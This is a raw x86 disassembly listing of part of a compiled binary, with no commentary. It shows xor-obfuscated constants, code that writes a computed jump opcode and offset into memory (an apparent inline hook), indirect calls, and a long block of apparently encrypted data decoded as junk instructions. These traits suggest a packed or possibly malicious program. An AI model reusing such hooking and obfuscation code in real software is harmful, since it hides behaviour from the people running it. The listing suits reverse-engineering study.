  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	aaa    
  41595f:	and    ecx,DWORD PTR [eax+0x7f106d7a]
  415965:	js     0x4158fc
  415967:	jle    0x4159e1
  415969:	js     0x4159de
  41596b:	scas   al,BYTE PTR es:[edi]
  41596c:	lahf   
  41596d:	mov    bl,0x0
  41596f:	out    0xea,al
  415971:	push   edi
  415972:	adc    eax,0xa1fe4c37
  415977:	push   esp
  415978:	cmp    DWORD PTR [eax+0x3f],eax
  41597b:	or     eax,0x75afbc67
  415980:	fsubr  QWORD PTR [ecx-0x2d39f018]
  415986:	retf   
  415987:	xchg   edx,eax
  415988:	scas   eax,DWORD PTR es:[edi]
  415989:	jno    0x415956
  41598b:	mov    dl,0x3d
  41598d:	sbb    DWORD PTR [eax-0x7c],eax
  415990:	ja     0x41595d
  415992:	add    BYTE PTR [ebx-0x61],bl
  415995:	or     BYTE PTR [esi],dl
  415997:	jg     0x4159b1
  415999:	or     DWORD PTR [ecx+0x76],ebx
  41599c:	inc    edi
  41599d:	or     al,BYTE PTR [ecx-0x3a]
  4159a0:	sahf   
  4159a1:	popa   
  4159a2:	data16 mov bh,0xf7
  4159a5:	test   DWORD PTR [ebx+0x74d8edd8],ecx
  4159ab:	dec    ecx
  4159ac:	mov    dl,0xf5
  4159ae:	xlat   BYTE PTR ds:[ebx]
  4159af:	and    esp,DWORD PTR [ebp-0x3f0a2890]
  4159b5:	in     al,0xe2
  4159b7:	in     eax,dx
  4159b8:	fisttp WORD PTR [esi-0x35031024]
  4159be:	and    ecx,0x138c0b8e
  4159c4:	inc    edi
  4159c5:	ror    al,0xf2
  4159c8:	sbb    eax,0x3170b94f
  4159cd:	lods   eax,DWORD PTR ds:[esi]
  4159ce:	test   ebp,edi
  4159d0:	popa   
  4159d1:	dec    ebp
  4159d2:	test   ch,dl
  4159d4:	push   ebp
  4159d5:	cdq    
  4159d6:	mov    ebp,0x3a852b6a
  4159db:	push   ebx
  4159dc:	and    DWORD PTR [eax],0xffffffeb
  4159df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e0:	int3   
  4159e1:	fisttp QWORD PTR [esi+0x1e]
  4159e4:	call   0x6d4b:0xa13a4024
  4159eb:	sbb    edx,esp
  4159ed:	or     DWORD PTR [esi-0x14bb195a],esp
  4159f3:	shl    DWORD PTR [ecx-0x52],cl
  4159f6:	mov    esp,0xa4a8c2e6
  4159fb:	jns    0x415a34
  4159fd:	inc    ecx
  4159fe:	xor    eax,0xdc08d5c2
  415a03:	fisubr WORD PTR [edi+0x6b]
  415a06:	sbb    cl,BYTE PTR [edx]
  415a08:	imul   ebx,edi,0xa9f402a4
  415a0e:	xchg   esi,eax
  415a0f:	dec    ebx
  415a10:	mov    ?,eax
  415a12:	xor    eax,0x89605c8e
  415a17:	pop    eax
  415a18:	inc    esp
  415a19:	pop    ds
  415a1a:	inc    edx
  415a1b:	pop    esi
  415a1c:	ret    0xd447
  415a1f:	das    
  415a20:	fsubr  QWORD PTR [ecx+ecx*4-0x3e]
  415a24:	sbb    bh,bh
  415a26:	jb     0x415a24
  415a28:	mov    dh,0x1e
  415a2a:	sti    
  415a2b:	or     al,ah
  415a2d:	imul   eax,eax,0x8e3b36a5
  415a33:	and    ecx,eax
  415a35:	cmp    ebx,ebx
  415a37:	adc    eax,0xf37f928b
  415a3c:	sbb    DWORD PTR [edi],0xffffffa7
  415a3f:	and    dh,BYTE PTR [eax+esi*1-0xcfb5da2]
  415a46:	std    
  415a47:	popa   
  415a48:	idiv   BYTE PTR [eax+0x15]
  415a4b:	pop    ecx
  415a4c:	fidivr WORD PTR [edx+0x7c755655]
  415a52:	inc    ecx
  415a53:	adc    edx,esp
  415a55:	ins    DWORD PTR es:[edi],dx
  415a56:	and    ah,BYTE PTR [ebx+edi*4+0x75]
  415a5a:	stos   BYTE PTR es:[edi],al
  415a5b:	or     bh,al
  415a5d:	out    dx,eax
  415a5e:	push   0x7a
  415a60:	dec    edx
  415a61:	repz or al,0xbd
  415a64:	in     al,0xf9
  415a66:	jae    0x415a71
  415a68:	push   ebp
  415a69:	push   ds
  415a6a:	add    bh,dl
  415a6c:	lods   al,BYTE PTR ds:[esi]
  415a6d:	and    BYTE PTR [eax-0x23],dl
  415a70:	and    eax,0x271db47f
  415a75:	push   edx
  415a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a77:	sbb    edx,DWORD PTR [ebp-0x1fda04a9]
  415a7d:	pop    ss
  415a7e:	jne    0x415a05
  415a80:	xchg   edi,eax
  415a81:	and    al,0xa0
  415a83:	inc    edi
  415a84:	(bad)  
  415a85:	dec    edi
  415a86:	jmp    0x90e2:0x9ce1df34
  415a8d:	xor    eax,0x4a2404d0
  415a92:	xchg   ecx,eax
  415a93:	add    BYTE PTR [eax-0x50],bl
  415a96:	ret    0x73bb
  415a99:	dec    ebp
  415a9a:	add    eax,0xfdf3cbcc
  415a9f:	shl    BYTE PTR [esi-0x16e9e261],0x78
  415aa6:	mov    ah,0xa3
  415aa8:	jo     0x415aa8
  415aaa:	fadd   QWORD PTR [edi-0x31d3585]
  415ab0:	mov    edx,0xf6c7d3b3
  415ab5:	stc    
  415ab6:	mov    eax,ds:0x83d207d8
  415abb:	mov    BYTE PTR [edx+0x1a6d8b1],0xa3
  415ac2:	mov    edi,0xdae6ebbc
  415ac7:	icebp  
  415ac8:	jo     0x415add
  415aca:	sbb    BYTE PTR [edi],0xaf
  415acd:	jb     0x415b49
  415acf:	adc    eax,0xa290c87e
  415ad4:	push   0xcd1aa99f
  415ad9:	mov    edx,0xb750bd47
  415ade:	xor    dh,ch
  415ae0:	inc    ebx
  415ae1:	stc    
  415ae2:	push   0x347e04b4
  415ae7:	sbb    al,0xf8
  415ae9:	aaa    
  415aea:	cmp    DWORD PTR [ebp-0x6d30af6f],esi
  415af0:	mov    eax,ds:0xdf30bac4
  415af5:	add    al,0xe7
  415af7:	mov    cl,0x48
  415af9:	and    edi,DWORD PTR [ecx-0x78]
  415afc:	mov    edx,0x5a7cd390
  415b01:	cli    
  415b02:	dec    eax
  415b03:	test   al,0x5c
  415b05:	pop    esi
  415b06:	rol    dl,cl
  415b08:	sbb    eax,0x4a37acf5
  415b0d:	or     esp,DWORD PTR [edx+0x6b]
  415b10:	inc    ecx
  415b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b12:	call   0x6ec3:0xd6636f72
  415b19:	out    0xef,al
  415b1b:	adc    ecx,ebx
  415b1d:	aad    0x5d
  415b1f:	mov    ch,0xbe
  415b21:	mov    esp,0x80e205d3
  415b26:	ja     0x415b0a
  415b28:	push   esp
  415b29:	cmp    al,0xee
  415b2b:	sub    al,0xa5
  415b2d:	fcomp  QWORD PTR [esi+0x45]
  415b30:	pop    esp
  415b31:	pop    ebp
  415b32:	jo     0x415af9
  415b34:	fldenv [edx+ebx*2-0x50]
  415b38:	jmp    0x6e9c:0xe68a0d23
  415b3f:	mov    ds:0xf3c532a8,al
  415b44:	dec    esp
  415b45:	shl    al,1
  415b47:	jae    0x415b49
  415b49:	add    DWORD PTR [ebx],edx
  415b4b:	push   edi
  415b4c:	outs   dx,DWORD PTR ds:[esi]
  415b4d:	pop    edi
  415b4e:	dec    ebx
  415b4f:	neg    DWORD PTR [esi]
  415b51:	test   al,0xb5
  415b53:	push   ds
  415b54:	jnp    0x415b5e
  415b56:	dec    esp
  415b57:	rcr    DWORD PTR [ecx+0x11],cl
  415b5a:	sbb    bl,BYTE PTR [esi+0xa]
  415b5d:	pop    edx
  415b5e:	sti    
  415b5f:	sbb    BYTE PTR [edi+edx*1+0x76],dl
  415b63:	or     ch,BYTE PTR [ebx+0x4987e68]
  415b69:	push   es
  415b6a:	mov    al,0x80
  415b6c:	pop    edx
  415b6d:	mov    cl,0xc3
  415b6f:	loope  0x415b9c
  415b71:	xchg   ecx,edx
  415b73:	jle    0x415beb
  415b75:	push   ebp
  415b76:	scas   al,BYTE PTR es:[edi]
  415b77:	mov    al,0x0
  415b79:	aad    0x78
  415b7b:	mov    edi,0x5a9ab0fc
  415b80:	hlt    
  415b81:	or     dh,bl
  415b83:	pop    ds
  415b84:	xor    edx,DWORD PTR [edx+0x10]
  415b87:	jl     0x415b58
  415b89:	adc    eax,0xaa609216
  415b8e:	cmp    al,0x96
  415b90:	mov    ebx,0xf4d76e6d
  415b95:	in     al,0x9b
  415b97:	push   ecx
  415b98:	inc    esp
  415b99:	or     DWORD PTR [eax-0x556b115d],edi
  415b9f:	mov    ah,0xec
  415ba1:	das    
  415ba2:	fdivrp st(0),st
  415ba4:	cmp    ebx,DWORD PTR [ecx+0x1c]
  415ba7:	dec    ecx
  415ba8:	dec    ebp
  415ba9:	cmp    cl,ch
  415bab:	repnz loopne 0x415bbf
  415bae:	xchg   edi,eax
  415baf:	or     BYTE PTR [ebp-0x1f],ch
  415bb2:	and    BYTE PTR [ecx+0x5fd6a5b6],0x3c
  415bb9:	and    al,0xa0
  415bbb:	or     al,BYTE PTR [edx+ebp*4+0x40736c5d]
  415bc2:	out    dx,al
  415bc3:	add    BYTE PTR ss:[edi+0x3ccee001],dl
  415bca:	dec    ebx
  415bcb:	into   
  415bcc:	xlat   BYTE PTR ds:[ebx]
  415bcd:	loopne 0x415c43
  415bcf:	mov    cs,esi
  415bd1:	mov    esi,ebp
  415bd3:	fdivr  st,st(7)
  415bd5:	push   cs
  415bd6:	xor    al,0xd9
  415bd8:	in     eax,dx
  415bd9:	jae    0x415bdd
  415bdb:	retf   0x7477
  415bde:	aam    0x66
  415be0:	dec    edi
  415be1:	int    0xa6
  415be3:	repnz dec edx
  415be5:	xlat   BYTE PTR ds:[ebx]
  415be6:	mov    ds:0xe320f630,al
  415beb:	push   cs
  415bec:	in     al,0xe9
  415bee:	je     0x415c53
  415bf0:	push   esi
  415bf1:	ds jmp 0xe526:0xd280b590
  415bf9:	outs   dx,BYTE PTR ds:[esi]
  415bfa:	jns    0x415c01
  415bfc:	inc    ecx
  415bfd:	jp     0x415c4d
  415bff:	jle    0x415bf5
  415c01:	cli    
  415c02:	fadd   DWORD PTR [edx-0x38aeaebb]
  415c08:	add    eax,0x42a7f5
  415c0d:	adc    BYTE PTR [eax],dl
  415c0f:	add    BYTE PTR [eax],al
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	rcr    BYTE PTR [eax-0x7f],cl
  415c42:	and    eax,0x787f158a
  415c47:	xchg   ebp,eax
  415c48:	jle    0x415cc2
  415c4a:	js     0x415c11
  415c4c:	lahf   
  415c4d:	adc    ebp,DWORD PTR [eax-0x65]
  415c50:	les    ebx,FWORD PTR [edi]
  415c52:	neg    DWORD PTR [eax]
  415c54:	jno    0x415cbe
  415c56:	test   DWORD PTR [ebx],edx
  415c58:	push   ds
  415c59:	mov    eax,ds:0x8fd6f2eb
  415c5e:	inc    esp
  415c5f:	fcom   DWORD PTR [ecx+edi*4+0x2d3fd6d0]
  415c66:	fbstp  TBYTE PTR [ecx+0x34]
  415c69:	cmp    DWORD PTR [edi+0x2e],edx
  415c6c:	push   ecx
  415c6d:	push   ss
  415c6e:	outs   dx,BYTE PTR ds:[esi]
  415c6f:	cmp    edx,DWORD PTR [eax]
  415c71:	xor    BYTE PTR [esi-0x1a],bl
  415c74:	(bad)  
  415c75:	fld    DWORD PTR [edi]
  415c77:	bnd jno 0x415c6b
  415c7a:	test   BYTE PTR [ebp-0x2ca58b24],dh
  415c80:	lea    ebx,[eax]
  415c82:	int    0x5d
  415c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c85:	sbb    BYTE PTR [ecx+0x61b75175],bh
  415c8b:	mov    BYTE PTR [eax-0x78f4b49d],al
  415c91:	icebp  
  415c92:	cmp    DWORD PTR [edx+0x264ecc5],eax
  415c98:	fistp  DWORD PTR [ebx-0x55d70bff]
  415c9e:	jg     0x415c72
  415ca0:	jp     0x415d10
  415ca2:	rcr    BYTE PTR [ecx-0x11ce350c],0xd9
  415ca9:	sub    DWORD PTR [ebx-0x35],edi
  415cac:	cdq    
  415cad:	sub    al,0x82
  415caf:	retf   
  415cb0:	ins    BYTE PTR es:[edi],dx
  415cb1:	mov    ch,0x67
  415cb3:	fadd   DWORD PTR [edx+0x16f1f2a1]
  415cb9:	xchg   ebx,eax
  415cba:	sub    eax,0x426c3fc
  415cbf:	mov    esi,0xbbb9bb3e
  415cc4:	call   0x51b8c2f7
  415cc9:	rcr    DWORD PTR [eax+0x38bcabde],cl
  415ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd0:	xor    al,0x57
  415cd2:	or     DWORD PTR [edx-0x5b54febc],esi
  415cd8:	div    BYTE PTR [eax-0x66]
  415cdb:	enter  0x43b5,0xf0
  415cdf:	cdq    
  415ce0:	imul   esi,DWORD PTR [ebx],0x62c2e325
  415ce6:	clc    
  415ce7:	mov    BYTE PTR [edx-0x11],dl
  415cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ceb:	inc    ebp
  415cec:	pop    ebx
  415ced:	or     al,0x91
  415cef:	lods   eax,DWORD PTR ds:[esi]
  415cf0:	sub    ecx,eax
  415cf2:	out    0x29,al
  415cf4:	int    0xf2
  415cf6:	jae    0x415caf
  415cf8:	shl    DWORD PTR [esi+0x1cfb1d21],1
  415cfe:	xchg   DWORD PTR [ebx-0x55],edx
  415d01:	pop    ebp
  415d02:	retf   
  415d03:	pop    es
  415d04:	jae    0x415cda
  415d06:	sub    BYTE PTR [ebx-0x54],dh
  415d09:	test   eax,0x8baaf0fb
  415d0e:	sbb    ebx,edi
  415d10:	push   ds
  415d11:	es pop eax
  415d13:	inc    ebx
  415d14:	pop    ecx
  415d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d16:	mov    ebp,0x906b0754
  415d1b:	mov    WORD PTR [edi],cs
  415d1d:	push   0x3d
  415d1f:	shl    edi,1
  415d21:	data16 and bl,0x52
  415d25:	pop    eax
  415d26:	fmul   DWORD PTR [eax+0x57]
  415d29:	sub    al,0xd1
  415d2b:	lea    eax,[ebp+eiz*4+0x109b923e]
  415d32:	ins    DWORD PTR es:[edi],dx
  415d33:	add    DWORD PTR [eiz*4+0x61ab32dc],ebx
  415d3a:	popf   
  415d3b:	ds xchg edx,eax
  415d3d:	jae    0x415d48
  415d3f:	call   0x5a324002
  415d44:	ret    
  415d45:	adc    DWORD PTR [edx],esi
  415d47:	pop    ss
  415d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d49:	out    dx,al
  415d4a:	sbb    DWORD PTR [edx-0x6f],edx
  415d4d:	xlat   BYTE PTR ds:[ebx]
  415d4e:	jmp    edi
  415d50:	fcom   DWORD PTR [ebx]
  415d52:	mov    edx,0xd3d73db8
  415d57:	cmp    BYTE PTR [eax+0x7],ah
  415d5a:	(bad)  
  415d5b:	js     0x415d3f
  415d5d:	scas   eax,DWORD PTR es:[edi]
  415d5e:	jnp    0x415dba
  415d60:	shl    DWORD PTR [edi],cl
  415d62:	sub    al,0x1d
  415d64:	mov    ds:0x3331e35d,al
  415d69:	test   DWORD PTR [ecx-0x57],ebp
  415d6c:	js     0x415de1
  415d6e:	sbb    DWORD PTR [edx+0x50],esp
  415d71:	or     cl,BYTE PTR [ebp+0x6c]
  415d74:	sub    cl,BYTE PTR [ebx+0x29a0c932]
  415d7a:	push   eax
  415d7b:	lock (bad) 
  415d7d:	sub    BYTE PTR [eax+0x36e902fb],al
  415d83:	sbb    BYTE PTR [ebp-0x51d4d820],ah
  415d89:	jge    0x415d96
  415d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d8c:	(bad)
  415d91:	jno    0x415d99
  415d93:	ss inc eax
  415d95:	mov    al,ds:0x691d8378
  415d9a:	add    ch,BYTE PTR [eax+eiz*2+0x54e40447]
  415da1:	test   DWORD PTR [ebx+0x4730ac16],ebx
  415da7:	jno    0x415d5e
  415da9:	sbb    ebx,DWORD PTR [ebx-0x65]
  415dac:	pop    esp
  415dad:	dec    DWORD PTR fs:[ecx+ecx*8-0x4b89fe43]
  415db5:	fs jae 0x415e17
  415db8:	inc    edi
  415db9:	ds pause 
  415dbc:	cmp    ebp,esp
  415dbe:	xchg   ch,al
  415dc0:	mov    ecx,0x634f6a8a
  415dc5:	inc    eax
  415dc6:	(bad)  
  415dc7:	xor    esi,esp
  415dc9:	jns    0x415dcb
  415dcb:	adc    dh,BYTE PTR [ecx+0x39]
  415dce:	sub    BYTE PTR [eax],cl
  415dd0:	stos   DWORD PTR es:[edi],eax
  415dd1:	sub    ah,BYTE PTR [edx]
  415dd3:	je     0x415e22
  415dd5:	push   es
  415dd6:	pop    eax
  415dd7:	jge    0x415e11
  415dd9:	stc    
  415dda:	clc    
  415ddb:	data16 jno 0x415df6
  415dde:	adc    eax,0x345a4d4b
  415de3:	mov    ch,0x9f
  415de5:	(bad)  
  415de6:	in     al,dx
  415de7:	mov    esi,0x45b442b1
  415dec:	mov    eax,edi
  415dee:	fild   QWORD PTR [ebp+0x5d644b7]
  415df4:	rcl    ebp,0x10
  415df7:	in     al,0x18
  415df9:	ja     0x415e15
  415dfb:	aad    0xdc
  415dfd:	ret    
  415dfe:	nop
  415dff:	push   edi
  415e00:	dec    ecx
  415e01:	inc    ebp
  415e02:	xor    al,0xe2
  415e04:	out    dx,al
  415e05:	popf   
  415e06:	xchg   edi,eax
  415e07:	loop   0x415e72
  415e09:	inc    edx
  415e0a:	sbb    ebp,DWORD PTR [ebx]
  415e0c:	fadd   QWORD PTR [ebp+0x78e3cf3e]
  415e12:	repnz aas 
  415e14:	sbb    BYTE PTR [ebx+0x10],bl
  415e17:	lds    ebx,FWORD PTR [ebp+0x79ca72b6]
  415e1d:	test   eax,0x6d0062b2
  415e22:	inc    ecx
  415e23:	call   0xa73b1ff8
  415e28:	push   edi
  415e29:	dec    edi
  415e2a:	fnstcw WORD PTR [esi-0x5300417c]
  415e30:	cmp    al,0xa7
  415e32:	nop
  415e33:	les    edi,FWORD PTR cs:[ecx]
  415e36:	cmp    BYTE PTR [ecx+ebx*8],dl
  415e39:	xchg   DWORD PTR [esi+0x18],esi
  415e3c:	xor    eax,DWORD PTR [edi]
  415e3e:	add    BYTE PTR [ebp+0x24],ah
  415e41:	adc    BYTE PTR [ebx+edi*2],bh
  415e44:	xor    al,0xfd
  415e46:	sub    al,0xc8
  415e48:	xor    bh,BYTE PTR [ecx-0x6c]
  415e4b:	xchg   ebx,eax
  415e4c:	jne    0x415e83
  415e4e:	sub    DWORD PTR [esi],esp
  415e50:	inc    ebp
  415e51:	dec    esp
  415e52:	dec    edi
  415e53:	mov    ecx,0xcc884ea8
  415e58:	(bad)  
  415e59:	retf   
  415e5a:	hlt    
  415e5b:	mov    al,0x57
  415e5d:	push   ds
  415e5e:	js     0x415eb3
  415e60:	into   
  415e61:	lahf   
  415e62:	mov    ds:0xe64c97ab,eax
  415e67:	dec    eax
  415e68:	sti    
  415e69:	outs   dx,DWORD PTR ds:[esi]
  415e6a:	lds    ebp,FWORD PTR [edi-0x6d]
  415e6d:	je     0x415e89
  415e6f:	xor    dl,0x66
  415e72:	add    eax,0xaa97504
  415e77:	push   ss
  415e78:	call   0x6098:0x697955cf
  415e7f:	rdpmc  
  415e81:	jl     0x415ea5
  415e83:	or     eax,DWORD PTR [eax]
  415e85:	xchg   esi,eax
  415e86:	push   0x245e8eab
  415e8b:	xor    eax,edx
  415e8d:	adc    eax,0xae4366ff
  415e92:	dec    esi
  415e93:	mov    ebp,0x8405c32b
  415e98:	inc    ebx
  415e99:	inc    eax
  415e9a:	push   edx
  415e9b:	pop    ebx
  415e9c:	push   edx
  415e9d:	push   0xd4b9ad60
  415ea2:	(bad)  
  415ea3:	cmc    
